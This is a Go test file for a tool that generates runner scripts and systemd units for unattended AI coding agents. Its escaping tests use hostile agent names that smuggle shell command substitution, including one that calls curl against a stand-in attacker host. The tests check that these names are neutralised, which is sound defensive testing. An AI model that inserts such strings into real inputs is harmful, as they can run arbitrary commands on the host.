package runner

import (
	"encoding/json"
	"fmt"
	"strings"
	"testing"

	"github.com/jahwag/clem/internal/config"
)

// mockHome overrides userHomeLookup for a test, returning testHome for any user.
// Returns a cleanup function that restores the original.
func mockHome(t *testing.T, testHome string) {
	t.Helper()
	orig := userHomeLookup
	userHomeLookup = func(_ string) (string, error) { return testHome, nil }
	t.Cleanup(func() { userHomeLookup = orig })
}

func baseCfg(agentKey string, ac config.AgentConfig) *config.Config {
	return &config.Config{
		Project: "test",
		Coordination: config.Coordination{
			Backend: "discord",
			Channels: map[string]string{
				"alerts":  "111",
				"tasks":   "222",
				"general": "333",
			},
		},
		Agents: map[string]config.AgentConfig{agentKey: ac},
	}
}

func TestGenerate_HeadroomWrapsClaudeLaunch(t *testing.T) {
	cfg := baseCfg("lead", config.AgentConfig{
		Name:      "Lead",
		Model:     "claude-opus-4-8",
		Iteration: "1m",
		Prompt:    "do the thing",
		Headroom:  true,
	})
	out := Generate(cfg, "lead")
	for _, want := range []string{
		`"$CLAUDE" mcp remove headroom`,
		"headroom wrap claude -p $HEADROOM_PORT --no-context-tool --no-serena",
		`log "headroom enabled but not installed; launching claude directly"`,
		"timeout 7200 $LAUNCH --dangerously-skip-permissions",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("expected %q in runner, got:\n%s", want, out)
		}
	}
}

func TestGenerate_HeadroomOffLaunchesClaudeDirectly(t *testing.T) {
	cfg := baseCfg("lead", config.AgentConfig{
		Name:      "Lead",
		Model:     "claude-opus-4-8",
		Iteration: "1m",
		Prompt:    "do the thing",
	})
	out := Generate(cfg, "lead")
	if strings.Contains(out, "headroom") {
		t.Errorf("headroom disabled but wrap present in runner:\n%s", out)
	}
	if !strings.Contains(out, `LAUNCH="$CLAUDE"`) {
		t.Errorf("expected direct claude launch, got:\n%s", out)
	}
}

func TestGenerate_HeadroomWrapsCodexLaunch(t *testing.T) {
	cfg := config.Config{
		Project: "test",
		Agents: map[string]config.AgentConfig{
			"worker": {
				Name:     "Worker",
				Runtime:  "codex",
				Headroom: true,
			},
		},
	}

	out := Generate(&cfg, "worker")
	for _, want := range []string{
		`export PATH="$HOME/.npm-global/bin:$HOME/.local/bin:$PATH"`,
		`headroom" wrap codex -p "$HEADROOM_PORT" --no-context-tool --no-serena`,
		`timeout 7200 "${LAUNCH[@]}" --dangerously-bypass-approvals-and-sandbox`,
	} {
		if !strings.Contains(out, want) {
			t.Errorf("headroom-enabled Codex runner missing %q:\n%s", want, out)
		}
	}
}

func TestGenerate_CavemanInjectsLevel(t *testing.T) {
	for _, level := range []config.CavemanLevel{config.CavemanLite, config.CavemanFull, config.CavemanUltra} {
		cfg := baseCfg("lead", config.AgentConfig{
			Name:      "Lead",
			Model:     "claude-opus-4-7",
			Iteration: "1m",
			Prompt:    "do the thing",
			Caveman:   level,
		})
		out := Generate(cfg, "lead")
		want := "/caveman " + level.Level()
		if !strings.Contains(out, want) {
			t.Errorf("level=%q: expected %q in runner, got:\n%s", level, want, out)
		}
	}
}

func TestGenerate_GatesExpiryWarningOnNonInteractiveCreds(t *testing.T) {
	cfg := baseCfg("lead", config.AgentConfig{
		Name:      "Lead",
		Model:     "claude-opus-4-7",
		Iteration: "1m",
		Prompt:    "do the thing",
	})
	out := Generate(cfg, "lead")
	// When ANTHROPIC_API_KEY or CLAUDE_CODE_OAUTH_TOKEN is set, the runner must
	// not inject the ".credentials.json expires soon" warning (false alarm).
	want := `if [ -z "$ANTHROPIC_API_KEY" ] && [ -z "$CLAUDE_CODE_OAUTH_TOKEN" ]; then`
	if !strings.Contains(out, want) {
		t.Errorf("expected expiry-warning guard %q in runner, got:\n%s", want, out)
	}
}

func TestGenerate_DisablesAutoUpdaterForSessionOnly(t *testing.T) {
	cfg := baseCfg("lead", config.AgentConfig{
		Name:      "Lead",
		Model:     "claude-opus-4-7",
		Iteration: "1m",
		Prompt:    "do the thing",
	})
	out := Generate(cfg, "lead")
	// The interactive TUI launch disables the in-session auto-updater (its
	// banner can't be cleared on a brokered-proxy host).
	if !strings.Contains(out, "DISABLE_AUTOUPDATER=1 timeout 7200 $LAUNCH") {
		t.Errorf("expected DISABLE_AUTOUPDATER on the claude launch, got:\n%s", out)
	}
	// ...but the explicit `claude install` must stay enabled so updates happen.
	if strings.Contains(out, `DISABLE_AUTOUPDATER=1 "$CLAUDE" install`) {
		t.Error("claude install must not be neutered by DISABLE_AUTOUPDATER")
	}
}

func TestGenerate_SkipsClaudeInstallOnProxyHosts(t *testing.T) {
	cfg := baseCfg("lead", config.AgentConfig{
		Name:      "Lead",
		Model:     "claude-opus-4-7",
		Iteration: "1m",
		Prompt:    "do the thing",
	})
	out := Generate(cfg, "lead")
	// claude install (bun fetch) can't traverse the egress proxy — it fails
	// "Socket is closed" every iteration. Skip it when HTTPS_PROXY is set.
	if !strings.Contains(out, `if [ -n "$HTTPS_PROXY" ]; then`) {
		t.Errorf("expected claude install gated on HTTPS_PROXY, got:\n%s", out)
	}
}

func TestGenerate_CavemanOffNoInjection(t *testing.T) {
	cfg := baseCfg("lead", config.AgentConfig{
		Name:      "Lead",
		Model:     "claude-opus-4-7",
		Iteration: "1m",
		Prompt:    "do the thing",
	})
	out := Generate(cfg, "lead")
	if strings.Contains(out, "/caveman") {
		t.Fatalf("expected no /caveman when unset, got:\n%s", out)
	}
}

func TestGenerate_SubagentModelExportPresent(t *testing.T) {
	cfg := baseCfg("lead", config.AgentConfig{
		Name:          "Lead",
		Model:         "claude-opus-4-7",
		Iteration:     "1m",
		Prompt:        "do the thing",
		SubagentModel: "claude-sonnet-4-6",
	})

	out := Generate(cfg, "lead")

	want := `export CLAUDE_CODE_SUBAGENT_MODEL="claude-sonnet-4-6"`
	if !strings.Contains(out, want) {
		t.Fatalf("expected runner to contain %q, got:\n%s", want, out)
	}
}

func TestGenerate_SubagentModelExportAbsentWhenUnset(t *testing.T) {
	cfg := baseCfg("lead", config.AgentConfig{
		Name:      "Lead",
		Model:     "claude-opus-4-7",
		Iteration: "1m",
		Prompt:    "do the thing",
	})

	out := Generate(cfg, "lead")

	if strings.Contains(out, "CLAUDE_CODE_SUBAGENT_MODEL") {
		t.Fatalf("expected no subagent export when unset, got:\n%s", out)
	}
}

func TestGenerate_SubagentModelOnOpencodeRuntime(t *testing.T) {
	cfg := baseCfg("lead", config.AgentConfig{
		Name:          "Lead",
		Runtime:       "opencode",
		Model:         "nemotron-3-nano:4b",
		Iteration:     "1m",
		Prompt:        "do the thing",
		SubagentModel: "claude-sonnet-4-6",
	})

	out := Generate(cfg, "lead")

	want := `export CLAUDE_CODE_SUBAGENT_MODEL="claude-sonnet-4-6"`
	if !strings.Contains(out, want) {
		t.Fatalf("expected opencode runner to contain %q, got:\n%s", want, out)
	}
}

func TestGenerate_AutoAppendsKillPPIDWhenMissing(t *testing.T) {
	cfg := baseCfg("lead", config.AgentConfig{
		Name:      "Lead",
		Model:     "claude-opus-4-7",
		Iteration: "1m",
		Prompt:    "do the thing", // no kill $PPID
	})

	out := Generate(cfg, "lead")

	if !strings.Contains(out, "kill $PPID") {
		t.Fatalf("expected auto-appended kill $PPID, got:\n%s", out)
	}
}

func TestGenerate_PreservesUserKillPPID(t *testing.T) {
	cfg := baseCfg("lead", config.AgentConfig{
		Name:      "Lead",
		Model:     "claude-opus-4-7",
		Iteration: "1m",
		Prompt:    "do the thing then kill $PPID",
	})

	out := Generate(cfg, "lead")

	if c := strings.Count(out, "kill $PPID"); c != 1 {
		t.Fatalf("expected exactly one kill $PPID, got %d in:\n%s", c, out)
	}
}

// bashDequoteDouble emulates bash's double-quote removal: inside "...",
// backslash is special only before $ ` " \ (and newline, which never appears
// in escapeForAlert output — json.Marshal encodes control chars). Used to
// replay the alert sink's decode chain — bash dequotes the -d argument, then
// the chat API parses JSON.
func bashDequoteDouble(s string) string {
	var b strings.Builder
	for i := 0; i < len(s); i++ {
		if s[i] == '\\' && i+1 < len(s) && strings.ContainsRune("$`\"\\", rune(s[i+1])) {
			b.WriteByte(s[i+1])
			i++
			continue
		}
		b.WriteByte(s[i])
	}
	return b.String()
}

func TestEscapeForAlert_RoundTripThroughSink(t *testing.T) {
	names := []string{
		"plain name",
		`Lead "Architect"`,
		"agent$(curl evil.example/x)",
		"agent`id`",
		`back\slash`,
		`tail backslash\`,
		"$HOME and ${SIZE}",
		"all\\of\"it`together`$(now)$",
		// Control chars are rejected at Load(), but the escaper must not
		// depend on that: json.Marshal encodes them to escape sequences.
		"line1\nline2\ttab",
		"html <&> chars",
		"unicode 日本 ⚠️",
	}
	for _, name := range names {
		escaped := escapeForAlert(name)

		// Safety: after escaping, bash must see no live $, ` or " — each must
		// sit behind a backslash, or expansion / argument-termination fires.
		for i := 0; i < len(escaped); i++ {
			c := escaped[i]
			if c == '\\' && i+1 < len(escaped) && strings.ContainsRune("$`\"\\", rune(escaped[i+1])) {
				i++
				continue
			}
			if c == '$' || c == '`' || c == '"' {
				t.Errorf("name %q: live %q at offset %d in escaped form %q", name, string(c), i, escaped)
			}
		}

		// Fidelity: replaying the sink (bash dequote, then JSON parse) must
		// reproduce the original name exactly.
		afterBash := bashDequoteDouble(escaped)
		var decoded string
		if err := json.Unmarshal([]byte(`"`+afterBash+`"`), &decoded); err != nil {
			t.Errorf("name %q: invalid JSON after bash dequote (%q): %v", name, afterBash, err)
			continue
		}
		if decoded != name {
			t.Errorf("name %q: round-trip produced %q", name, decoded)
		}
	}
}

func TestGenerate_AlertCurlEscapesAgentName(t *testing.T) {
	hostile := "Lead$(id) \"x\" `y` z\\w"
	cfg := baseCfg("lead", config.AgentConfig{
		Name:      hostile,
		Model:     "claude-opus-4-7",
		Iteration: "1m",
		Prompt:    "do the thing",
	})

	out := Generate(cfg, "lead")

	var alertLine string
	for _, line := range strings.Split(out, "\n") {
		if strings.Contains(line, "-d ") && strings.Contains(line, "content") {
			alertLine = line
			break
		}
	}
	if alertLine == "" {
		t.Fatalf("alert curl -d line not found in runner:\n%s", out)
	}
	// "Lead$(id)" only matches the unescaped form — the escaped line carries
	// "Lead\$(id)", whose backslash breaks the substring.
	if strings.Contains(alertLine, "Lead$(id)") {
		t.Errorf("raw command substitution survives in alert line: %s", alertLine)
	}
	if strings.Contains(alertLine, "`y`") {
		t.Errorf("raw backtick substitution survives in alert line: %s", alertLine)
	}
	if !strings.Contains(alertLine, escapeForAlert(hostile)) {
		t.Errorf("escaped name missing from alert line: %s", alertLine)
	}
	// The static message text still relies on runtime expansion of ${SIZE} —
	// escaping must apply to the name only.
	if !strings.Contains(alertLine, "${SIZE}") {
		t.Errorf("runtime ${SIZE} expansion lost from alert line: %s", alertLine)
	}
}

func TestGenerate_SubstitutesPromptPlaceholders(t *testing.T) {
	cfg := baseCfg("workerb", config.AgentConfig{
		Name:      "Solane",
		Role:      "Software Engineer",
		Model:     "claude-opus-4-7",
		Iteration: "1m",
		Prompt:    "Act as {{agent.name}} ({{agent.role}}) in #{{channels.general}}",
	})

	out := Generate(cfg, "workerb")

	for _, want := range []string{"Act as Solane (Software Engineer)", "#333"} {
		if !strings.Contains(out, want) {
			t.Errorf("expected %q in runner, got:\n%s", want, out)
		}
	}
	if strings.Contains(out, "{{agent.name}}") || strings.Contains(out, "{{agent.role}}") || strings.Contains(out, "{{channels.general}}") {
		t.Errorf("placeholders left unsubstituted in runner:\n%s", out)
	}
}

func TestGenerate_DisablesClaudeAIConnectorMCPs(t *testing.T) {
	cfg := baseCfg("lead", config.AgentConfig{
		Name:      "Lead",
		Model:     "claude-opus-4-7",
		Iteration: "1m",
		Prompt:    "do the thing",
	})

	out := Generate(cfg, "lead")

	for _, want := range []string{
		"export ENABLE_CLAUDEAI_MCP_SERVERS=false",
		"export CLAUDE_CODE_IDE_SKIP_AUTO_INSTALL=1",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("expected runner to contain %q, got:\n%s", want, out)
		}
		// Must export BEFORE sourcing .env so operators can override per-host.
		exportIdx := strings.Index(out, want)
		sourceIdx := strings.Index(out, `source "$HOME/.env"`)
		if exportIdx < 0 || sourceIdx < 0 || exportIdx > sourceIdx {
			t.Errorf("expected %q to precede .env source (export=%d, source=%d)", want, exportIdx, sourceIdx)
		}
	}
}

// TestGenerate_McpBinResolverPrefersPipx pins the pipx-vs-system fallback
// in the runner's .mcp.json writer. v0.9.5 introduced _mcp_bin to stop
// hardcoding /usr/local/bin paths that desync from system Python state and
// require manual operator edits to .mcp.json every iteration. The helper
// must (a) be defined, (b) prefer /opt/pipx/bin, (c) fall back to
// /usr/local/bin, and (d) be used at every Python-MCP call site.
func TestGenerate_McpBinResolverPrefersPipx(t *testing.T) {
	cfg := baseCfg("lead", config.AgentConfig{
		Name:      "Lead",
		Model:     "claude-opus-4-7",
		Iteration: "1m",
		Prompt:    "do the thing",
	})
	out := Generate(cfg, "lead")

	if !strings.Contains(out, "def _mcp_bin(name):") {
		t.Error("runner must define _mcp_bin in the .mcp.json writer")
	}
	if !strings.Contains(out, "'/opt/pipx/bin/' + name") {
		t.Error("_mcp_bin must check the pipx path /opt/pipx/bin/<name> first")
	}
	if !strings.Contains(out, "'/usr/local/bin/' + name") {
		t.Error("_mcp_bin must fall back to /usr/local/bin/<name>")
	}
	// prefect-mcp was removed (SSH-based MCPs are dropped under agent-vault).
	for _, mcp := range []string{"mcp-discord", "social-mcp", "slack-mcp-server"} {
		want := "_mcp_bin('" + mcp + "')"
		if !strings.Contains(out, want) {
			t.Errorf("runner must resolve %s via _mcp_bin, expected substring %q", mcp, want)
		}
	}
	if strings.Contains(out, "prefect-mcp") {
		t.Error("prefect-mcp should have been removed from the runner template")
	}
	// Hardcoded /usr/local/bin/<mcp> calls outside _mcp_bin would defeat
	// the fallback. Pin them out so a future copy-paste cannot regress.
	for _, banned := range []string{
		"'command': '/usr/local/bin/mcp-discord'",
		"'command': '/usr/local/bin/social-mcp'",
	} {
		if strings.Contains(out, banned) {
			t.Errorf("runner must not hardcode %q (use _mcp_bin)", banned)
		}
	}
}

func TestGenerateService_EgressEnabledLoopbackOnly(t *testing.T) {
	mockHome(t, "/home/test-lead")
	cfg := baseCfg("lead", config.AgentConfig{
		Name:      "Lead",
		Model:     "claude-opus-4-7",
		Iteration: "1m",
		Prompt:    "do the thing",
	})
	cfg.Egress.Enabled = true

	out, err := GenerateService(cfg, "lead")
	if err != nil {
		t.Fatalf("GenerateService: %v", err)
	}
	// Loopback-only block + agent-vault/nftables unit ordering, no hardcoded CIDRs.
	for _, want := range []string{
		"IPAddressDeny=any",
		"IPAddressAllow=127.0.0.0/8",
		"After=clem-agent-vault-test.service clem-nftables-test.service",
		"Wants=clem-agent-vault-test.service",
		"Requires=clem-nftables-test.service", // firewall is fail-closed
	} {
		if !strings.Contains(out, want) {
			t.Errorf("expected %q in service unit, got:\n%s", want, out)
		}
	}
	if strings.Contains(out, "104.16.0.0/13") || strings.Contains(out, "140.82.112.0/20") {
		t.Errorf("hardcoded CIDR allowlist should be gone, got:\n%s", out)
	}
}

func TestGenerateService_DeprecatedFlagStillEnables(t *testing.T) {
	mockHome(t, "/home/test-lead")
	cfg := baseCfg("lead", config.AgentConfig{
		Name:                          "Lead",
		Model:                         "claude-opus-4-7",
		Iteration:                     "1m",
		Prompt:                        "do the thing",
		EgressRestrictionExperimental: true,
	})

	out, err := GenerateService(cfg, "lead")
	if err != nil {
		t.Fatalf("GenerateService: %v", err)
	}
	if !strings.Contains(out, "IPAddressDeny=any") {
		t.Errorf("deprecated egress_restriction_experimental should still enable containment, got:\n%s", out)
	}
}

func TestGenerateService_EgressDisabled(t *testing.T) {
	mockHome(t, "/home/test-lead")
	cfg := baseCfg("lead", config.AgentConfig{
		Name:      "Lead",
		Model:     "claude-opus-4-7",
		Iteration: "1m",
		Prompt:    "do the thing",
	})

	out, err := GenerateService(cfg, "lead")
	if err != nil {
		t.Fatalf("GenerateService: %v", err)
	}
	if strings.Contains(out, "IPAddressDeny") {
		t.Fatalf("expected no IPAddressDeny when egress unset, got:\n%s", out)
	}
	if strings.Contains(out, "clem-agent-vault") {
		t.Fatalf("expected no agent-vault unit deps when egress unset, got:\n%s", out)
	}
}

func TestGenerate_DiscordWatchChannelsWired(t *testing.T) {
	cfg := baseCfg("worker", config.AgentConfig{
		Name:      "Worker",
		Model:     "claude-opus-4-7",
		Iteration: "1m",
		Prompt:    "do the thing",
	})

	out := Generate(cfg, "worker")

	// Channels are sorted by name (alerts, general, tasks) -> 111,333,222.
	wantList := "111,333,222"
	if !strings.Contains(out, "DISCORD_WATCH_CHANNELS") {
		t.Fatalf("expected DISCORD_WATCH_CHANNELS substitution, got:\n%s", out)
	}
	if !strings.Contains(out, wantList) {
		t.Fatalf("expected channel list %q in runner, got:\n%s", wantList, out)
	}
	if !strings.Contains(out, "CLEM_TMUX_TARGET") {
		t.Fatalf("expected CLEM_TMUX_TARGET substitution, got:\n%s", out)
	}
	// Tmux target = agent key, since clem starts the tmux session under that name.
	if !strings.Contains(out, "'CLEM_TMUX_TARGET'] = 'worker'") {
		t.Fatalf("expected tmux target = 'worker', got:\n%s", out)
	}
}

func TestGenerate_DiscordDeliveryStatePathWiredForEveryRuntime(t *testing.T) {
	for _, runtime := range []string{"", "opencode", "codex"} {
		t.Run(runtime, func(t *testing.T) {
			cfg := baseCfg("worker", config.AgentConfig{
				Name:      "Worker",
				Runtime:   runtime,
				Model:     "test-model",
				Iteration: "1m",
				Prompt:    "do the thing",
			})

			out := Generate(cfg, "worker")
			for _, want := range []string{
				"DISCORD_DELIVERY_STATE_PATH",
				"discord-delivery.json",
			} {
				if !strings.Contains(out, want) {
					t.Fatalf("runtime %q missing %q in Discord MCP env", runtime, want)
				}
			}
		})
	}
}

func TestGenerate_DiscordReconcilesHistoryAtIterationBoundaries(t *testing.T) {
	cfg := baseCfg("worker", config.AgentConfig{
		Name:      "Worker",
		Model:     "claude-opus-4-7",
		Iteration: "1m",
		Prompt:    "do the thing",
	})

	out := Generate(cfg, "worker")

	for _, want := range []string{
		"Push notifications are wake-up hints only",
		"mcp__discord-bot__read_pending_messages",
		"mcp__discord-bot__acknowledge_delivery",
		"delivery_id",
		"stable client_message_id for that logical outbound message",
		"triggering message ID plus a stable purpose or phase discriminator",
		"Retries of the same logical reply reuse that client_message_id",
		"receipt and resolution, use different discriminators",
		"fall back to read_messages",
		"limit 100",
		"Before other work",
		"before ending or recycling the iteration",
		"Never require the operator to resend",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("expected Discord history replay instruction %q in runner, got:\n%s", want, out)
		}
	}
}

func TestGenerate_SlackReconcilesHistoryAtIterationBoundaries(t *testing.T) {
	cfg := baseCfg("worker", config.AgentConfig{
		Name:      "Worker",
		Model:     "claude-opus-4-7",
		Iteration: "1m",
		Prompt:    "do the thing",
	})
	cfg.Coordination.Backend = "slack"

	out := Generate(cfg, "worker")

	for _, want := range []string{
		"Polling is message delivery",
		"mcp__slack-mcp__conversations_history",
		"limit \"100\"",
		"mcp__slack-mcp__conversations_replies",
		"Before other work",
		"before ending or recycling the iteration",
		"Never require the operator to resend",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("expected Slack history replay instruction %q in runner, got:\n%s", want, out)
		}
	}
	if strings.Contains(out, "mcp__discord-bot__read_messages") {
		t.Fatalf("Slack runner must not receive Discord replay instructions, got:\n%s", out)
	}
}

func TestGenerate_GitHubDoesNotInjectChatHistoryReplay(t *testing.T) {
	cfg := baseCfg("worker", config.AgentConfig{
		Name:      "Worker",
		Model:     "claude-opus-4-7",
		Iteration: "1m",
		Prompt:    "do the thing",
	})
	cfg.Coordination.Backend = "github"

	out := Generate(cfg, "worker")

	if strings.Contains(out, "coordination replay") {
		t.Fatalf("GitHub runner must not receive chat history replay instructions, got:\n%s", out)
	}
}

func TestGenerate_CoordinationReplayAppliesToEveryInteractiveRuntime(t *testing.T) {
	for _, runtime := range []string{"", "opencode", "codex"} {
		t.Run(runtime, func(t *testing.T) {
			cfg := baseCfg("worker", config.AgentConfig{
				Name:      "Worker",
				Runtime:   runtime,
				Model:     "test-model",
				Iteration: "1m",
				Prompt:    "do the thing",
			})

			out := Generate(cfg, "worker")
			replayAt := strings.Index(out, "[clem coordination replay]")
			if replayAt == -1 {
				t.Fatalf("runtime %q missing coordination replay instruction", runtime)
			}
		})
	}
}

func TestGenerate_DiscordWatchEmptyWhenNoChannels(t *testing.T) {
	cfg := &config.Config{
		Project: "test",
		Coordination: config.Coordination{
			Backend:  "discord",
			Channels: map[string]string{},
		},
		Agents: map[string]config.AgentConfig{
			"worker": {
				Name:      "Worker",
				Model:     "claude-opus-4-7",
				Iteration: "1m",
				Prompt:    "do the thing",
			},
		},
	}

	out := Generate(cfg, "worker")

	// _watch resolves to '' so the wrapper if-block stays inert: tokens may be set
	// but neither DISCORD_WATCH_CHANNELS nor CLEM_TMUX_TARGET should be assigned.
	if strings.Contains(out, "_discord_env['DISCORD_WATCH_CHANNELS']") &&
		!strings.Contains(out, "_watch = ''") {
		t.Fatalf("expected empty _watch when no channels configured, got:\n%s", out)
	}
}

func TestGenerate_DiscordWatchSkippedForNonDiscordBackend(t *testing.T) {
	cfg := &config.Config{
		Project: "test",
		Coordination: config.Coordination{
			Backend: "slack",
			Channels: map[string]string{
				"general": "C1234",
			},
		},
		Agents: map[string]config.AgentConfig{
			"worker": {
				Name:      "Worker",
				Model:     "claude-opus-4-7",
				Iteration: "1m",
				Prompt:    "do the thing",
			},
		},
	}

	out := Generate(cfg, "worker")

	// Slack channel IDs must not leak into the Discord-watch env block.
	if strings.Contains(out, "C1234") {
		t.Fatalf("expected slack channel id NOT to appear in discord watcher block, got:\n%s", out)
	}
}

func TestGenerate_DiscordWatchWiredWhenBackendOmitted(t *testing.T) {
	// An empty backend field resolves to discord via coordination.Known, so
	// the watcher must be wired exactly as if "discord" were written out.
	cfg := baseCfg("worker", config.AgentConfig{
		Name:      "Worker",
		Model:     "claude-opus-4-7",
		Iteration: "1m",
		Prompt:    "do the thing",
	})
	cfg.Coordination.Backend = ""

	out := Generate(cfg, "worker")

	wantList := "111,333,222"
	if !strings.Contains(out, wantList) {
		t.Fatalf("expected channel list %q when backend omitted, got:\n%s", wantList, out)
	}
}

func TestGenerateService_PullsTtydUp(t *testing.T) {
	mockHome(t, "/home/test-worker")
	cfg := baseCfg("worker", config.AgentConfig{
		Name:      "Worker",
		Model:     "claude-opus-4-7",
		Iteration: "1m",
		Prompt:    "do the thing",
	})

	out, err := GenerateService(cfg, "worker")
	if err != nil {
		t.Fatalf("GenerateService: %v", err)
	}
	// Wants= ensures starting clem-test-worker also pulls the ttyd sidecar.
	// Without this, BindsTo+PartOf only propagate stops back, leaving the
	// web terminal dead until the next provision.
	want := "Wants=clem-ttyd-test-worker.service"
	if !strings.Contains(out, want) {
		t.Fatalf("expected %q in service unit, got:\n%s", want, out)
	}
}

func TestGenerateTtydService_JoinsAgentPrivateTmp(t *testing.T) {
	mockHome(t, "/home/test-worker")
	cfg := baseCfg("worker", config.AgentConfig{
		Name: "Worker", Model: "claude-opus-4-7", Iteration: "1m", Prompt: "do the thing",
	})

	out := GenerateTtydService(cfg, "worker")

	// The agent unit runs with PrivateTmp=yes; ttyd must opt into the same
	// namespacing AND join the agent's namespace, otherwise tmux attach fails
	// because the socket lives in a /tmp it cannot see (clem #106).
	for _, want := range []string{
		"PrivateTmp=yes",
		"JoinsNamespaceOf=clem-test-worker.service",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("expected %q in ttyd unit, got:\n%s", want, out)
		}
	}

	// JoinsNamespaceOf is a [Unit]-section directive. If it lands in
	// [Service] systemd silently ignores it and the namespace is not joined
	// (clem #106 follow-up). Anchor on newline to avoid matching the same
	// tokens inside doc comments.
	serviceIdx := strings.Index(out, "\n[Service]")
	joinsIdx := strings.Index(out, "\nJoinsNamespaceOf=")
	if serviceIdx == -1 || joinsIdx == -1 {
		t.Fatalf("missing required section/directive in ttyd unit:\n%s", out)
	}
	if joinsIdx > serviceIdx {
		t.Errorf("JoinsNamespaceOf must live in [Unit] before [Service], got:\n%s", out)
	}
}

func TestGenerateService_HardeningDirectivesPresent(t *testing.T) {
	mockHome(t, "/home/test-lead")
	cfg := baseCfg("lead", config.AgentConfig{
		Name: "Lead", Model: "claude-opus-4-7", Iteration: "1m", Prompt: "do the thing",
	})
	out, err := GenerateService(cfg, "lead")
	if err != nil {
		t.Fatalf("GenerateService: %v", err)
	}
	for _, want := range []string{
		"NoNewPrivileges=yes",
		"ProtectSystem=strict",
		"PrivateTmp=yes",
		"ReadOnlyPaths=-/home/test-lead/CLAUDE.md -/home/test-lead/CLAUDE.local.md",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("expected %q in service unit, got:\n%s", want, out)
		}
	}
	// ProtectHome=read-only was dropped in v0.9.3 — see buildHardeningDirectives
	// doc comment for the rationale (cross-agent isolation already comes from
	// 0750 perms on /home/<agent>; ProtectHome added EROFS whack-a-mole without
	// adding security against the threat model). Pin it removed so a future
	// well-meaning re-add cannot silently regress every Claude Code path.
	for _, banned := range []string{
		"ProtectHome=",
		"ReadWritePaths=",
	} {
		if strings.Contains(out, banned) {
			t.Errorf("hardening must not contain %q (cross-agent isolation = Unix perms; per-path RW carveouts cause EROFS regressions). Got:\n%s", banned, out)
		}
	}
}

func TestGenerateService_HardeningUsesAbsoluteHomePath(t *testing.T) {
	const customHome = "/data/agents/custom-home"
	mockHome(t, customHome)
	cfg := baseCfg("lead", config.AgentConfig{
		Name: "Lead", Model: "claude-opus-4-7", Iteration: "1m", Prompt: "do the thing",
	})
	out, err := GenerateService(cfg, "lead")
	if err != nil {
		t.Fatalf("GenerateService: %v", err)
	}
	if !strings.Contains(out, customHome) {
		t.Errorf("expected absolute home path %q in service unit, got:\n%s", customHome, out)
	}
	if strings.Contains(out, "%h") {
		t.Errorf("service unit must not contain %%h specifier, got:\n%s", out)
	}
}

func TestGenerate_OpencodeRunnerHasInstructionGuard(t *testing.T) {
	cfg := baseCfg("lead", config.AgentConfig{
		Name:      "Lead",
		Runtime:   "opencode",
		Model:     "nemotron-3-nano:4b",
		Iteration: "1m",
		Prompt:    "do the thing",
	})
	out := Generate(cfg, "lead")

	// opencode reads AGENTS.md, not CLAUDE.local.md, so the oversize guard must
	// check the file the runtime actually reads.
	for _, want := range []string{
		"MAX_CLAUDE_MD_BYTES=12288",
		"MAX_LESSONS_MESSAGES=25",
		`if [ -f "$WORKDIR/AGENTS.md" ]`,
		"SIZE > MAX_CLAUDE_MD_BYTES",
		"WARNING: AGENTS.md is ${SIZE} bytes",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("opencode runner missing AGENTS.md guard: expected %q\nfull output:\n%s", want, out)
		}
	}
	if strings.Contains(out, "CLAUDE.local.md") {
		t.Errorf("opencode runner should not reference CLAUDE.local.md (uses AGENTS.md)")
	}
}

func TestGenerate_CodexRunnerSelected(t *testing.T) {
	cfg := baseCfg("lead", config.AgentConfig{
		Name:      "Lead",
		Runtime:   "codex",
		Model:     "gpt-5.4-codex",
		Effort:    "high",
		Iteration: "1m",
		Prompt:    "do the thing. When done, run: kill $PPID",
	})
	out := Generate(cfg, "lead")

	for _, want := range []string{
		`CODEX="$HOME/.npm-global/bin/codex"`, // codex binary path
		`CODEX_UPDATER="$HOME/.local/bin/clem-codex-update"`,
		"~/.codex/config.toml",                       // TOML config target
		`cli_auth_credentials_store = \"file\"`,      // headless auth store
		`forced_login_method = \"chatgpt\"`,          // clem login OAuth flow
		`check_for_update_on_startup = false`,        // Clem owns staged updates
		`model_reasoning_effort = \"high\"`,          // harness-neutral effort passthrough
		"[mcp_servers.",                              // TOML MCP tables
		"~/.clem/mcp-servers.json",                   // harness-neutral extension MCPs
		"--dangerously-bypass-approvals-and-sandbox", // unattended execution
		`timeout 7200 "${LAUNCH[@]}"`,                // 2h interactive TUI cap
		"tmux send-keys -l -t lead",                  // prompt injection contract
		"tmux send-keys -t lead Escape",              // close $ skill picker before submit
		`pane() { tmux capture-pane -p -t lead`,      // state-driven injection reads the pane
		"esc to interrupt|Worked for",                // submission is verified, not assumed
		"Phase 3: stuck-state watchdog",              // mid-session recovery loop
		"log out and sign in again",                  // dead-auth banner recycles the session
		`kill "$DRIVER_PID"`,                         // driver dies with the CLI session
		"--model gpt-5.4-codex",                      // model passthrough
		`NEXT_EFFORT_FILE="$HOME/.clem/next-effort"`, // shared one-session effort handoff
		`CODEX_EFFORT_ARGS=(-c "model_reasoning_effort=\"$NEXT_EFFORT\"")`,
		`rollback-early "$PROMOTED_VERSION"`, // transactional early-failure rollback
	} {
		if !strings.Contains(out, want) {
			t.Errorf("codex runner missing %q\nfull output:\n%s", want, out)
		}
	}
	if strings.Contains(out, "npm install -g") {
		t.Errorf("codex runner must not update the live installation in place")
	}

	// Codex must NOT carry the Anthropic-only quota machinery.
	if strings.Contains(out, "credentials.json") {
		t.Errorf("codex runner should not reference claude credentials.json")
	}
}

func TestGenerate_OpencodeRunnerMergesManagedMCPManifest(t *testing.T) {
	cfg := baseCfg("lead", config.AgentConfig{
		Name: "Lead", Runtime: "opencode", Iteration: "1m", Prompt: "do the thing",
	})
	out := Generate(cfg, "lead")
	for _, want := range []string{"~/.clem/mcp-servers.json", "'type': 'local'", "'type': 'remote'"} {
		if !strings.Contains(out, want) {
			t.Errorf("opencode runner missing managed MCP adapter %q", want)
		}
	}
}

func TestGenerate_CodexEffortMaxMapsToXHigh(t *testing.T) {
	cfg := baseCfg("lead", config.AgentConfig{
		Name: "Lead", Runtime: "codex", Effort: "max", Iteration: "1m", Prompt: "work",
	})
	out := Generate(cfg, "lead")
	if !strings.Contains(out, `model_reasoning_effort = \"xhigh\"`) {
		t.Fatalf("codex max effort should map to xhigh:\n%s", out)
	}
}

